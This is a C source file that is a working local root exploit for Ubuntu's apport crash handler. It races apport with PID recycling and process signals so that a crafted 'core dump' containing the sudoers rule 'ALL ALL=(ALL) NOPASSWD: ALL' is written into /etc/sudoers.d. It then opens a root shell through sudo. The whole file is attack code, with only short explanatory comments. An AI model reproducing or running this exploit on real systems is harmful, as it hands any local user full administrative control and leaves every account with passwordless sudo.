#include <stdio.h>
#include <stdlib.h>
#include <sys/types.h>
#include <signal.h>
#include <sys/mman.h>
#include <sys/syscall.h>
#include <sys/stat.h>
#include <fcntl.h>
#include <sys/resource.h>
#include <unistd.h>
#include <string.h>
#include <sys/wait.h>


char *crash_report = "ProblemType: Crash\nArchitecture: amd64\nCrashCounter: 0\nDate: Sat May  9 18:18:33 2015\nDistroRelease: Ubuntu 15.04\nExecutablePath: /bin/sleep\nExecutableTimestamp: 1415000653\nProcCmdline: sleep 1337\nProcCwd: /home/rebel\nProcEnviron:\n XDG_RUNTIME_DIR=<set>\nProcMaps:\n 00400000-00407000 r-xp 00000000 08:01 393307                             /bin/sleep\nProcStatus:\n Name:  sleep\nSignal: 11\nUname: Linux 3.19.0-15-generic x86_64\nUserGroups:\n_LogindSession: 23\nCoreDump: base64\n H4sICAAAAAAC/0NvcmVEdW1wAA==\n U1ZgZGJm4eLicvTxUQBiWw0goang5x/gGBwc7mIFEuMCAA==\n";
/*
last line is the stuff we write to the corefile

c = zlib.compressobj(9,zlib.DEFLATED,-zlib.MAX_WBITS)
t = '# \x01\x02\x03\x04\n\n\nALL ALL=(ALL) NOPASSWD: ALL\n'
# need some non-ASCII bytes so it doesn't turn into a str()
# which makes apport fail with the following error:
#    os.write(core_file, r['CoreDump'])
# TypeError: 'str' does not support the buffer interface
t = bytes(t,'latin1')
c.compress(t)
a = c.flush()
import base64
base64.b64encode(a)

# b'U1ZgZGJm4eLicvTxUQBiWw0goang5x/gGBwc7mIFEuMCAA=='
*/

int apport_pid;
char report[128];

void steal_pid(int wanted_pid)
{
    int x, pid;

    pid = getpid();

    fprintf(stderr,"getting pid %d\n", wanted_pid);
    fprintf(stderr,"current pid = %d..", pid);

    for(x = 0; x < 500000; x++) {
        pid = fork();
        if(pid == 0) {
            pid = getpid();
            if(pid % 2500 == 0)
                fprintf(stderr,"%d..", pid);

            if(pid == wanted_pid) {
                fprintf(stderr,"\n** child: current pid = %d\n", pid);
                fprintf(stderr,"** child: executing /bin/su\n");

                execl("/bin/su", "su", NULL);
            }
            exit(0);
            return;
        }
        if(pid == wanted_pid)
            return;

        wait(NULL);
    }

}



void checker(void)
{
    struct stat s;
    int fd, mode, x;

    stat(report, &s);

    fprintf(stderr,"\nchecker: mode %d\nwaiting for file to be unlinked..", s.st_mode);

    mode = s.st_mode;

    while(1) {
// poor man's pseudo-singlestepping
        kill(apport_pid, SIGCONT);
        kill(apport_pid, SIGSTOP);

// need to wait a bit for the signals to be handled,
// otherwise we'll miss when the new report file is created
        for(x = 0; x < 100000; x++);

        stat(report, &s);

        if(s.st_mode != mode)
            break;
    }

    fprintf(stderr,"\nchecker: new mode %d .. done\n", s.st_mode);

    unlink(report);
    mknod(report, S_IFIFO | 0666, 0);

    fprintf(stderr,"checker: SIGCONT\n");
    kill(apport_pid, SIGCONT);

    fprintf(stderr,"checker: writing core\n");

    fd = open(report, O_WRONLY);
    write(fd, crash_report, strlen(crash_report));
    close(fd);
    fprintf(stderr,"checker: done\n");

    while(1)
        sleep(1);
}



void crasher()
{
    chdir("/etc/sudoers.d");

    fprintf(stderr,"crasher: my pid is %d\n", getpid());

    execl("/bin/sleep", "sleep", "1337", NULL);

    exit(0);
}


int main(void)
{
    int pid, checker_pid, fd;
    struct rlimit limits;
    struct stat s;

    limits.rlim_cur = RLIM_INFINITY;
    limits.rlim_max = RLIM_INFINITY;
    setrlimit(RLIMIT_CORE, &limits);

    pid = fork();

    if(pid == 0)
        crasher();

    sprintf(report, "/var/crash/_bin_sleep.%d.crash", getuid());

    unlink(report);
    mknod(report, S_IFIFO | 0666, 0);

    fprintf(stderr,"created %s\n", report);

    usleep(300000);
    kill(pid, 11);
    apport_pid = pid + 1;
// could check that pid+1 is actually apport here but it's
// kind of likely
    fprintf(stderr,"apport stopped, pid = %d\n", apport_pid);

    usleep(300000);

    kill(pid, 9);
    steal_pid(pid);
    sleep(1);

    kill(apport_pid, SIGSTOP);

    checker_pid = fork();

    if(checker_pid == 0) {
        checker();
        exit(0);
    }

    fprintf(stderr,"sleeping 2s..\n");
    sleep(2);

    fprintf(stderr,"writing to fifo\n");

    fd = open(report, O_WRONLY);
    write(fd, crash_report, strlen(crash_report));
    close(fd);

    fprintf(stderr,"fifo written.. wait...\n");
    fprintf(stderr,"waiting for /etc/sudoers.d/core to appear..\n");

    while(1) {
        stat("/etc/sudoers.d/core", &s);
        if(s.st_size == 37)
            break;
        usleep(100000);
    }

    fprintf(stderr,"success\n");
    kill(pid, 9);
    kill(checker_pid, 9);
    return system("sudo -- sh -c 'stty echo;sh -i'");
}
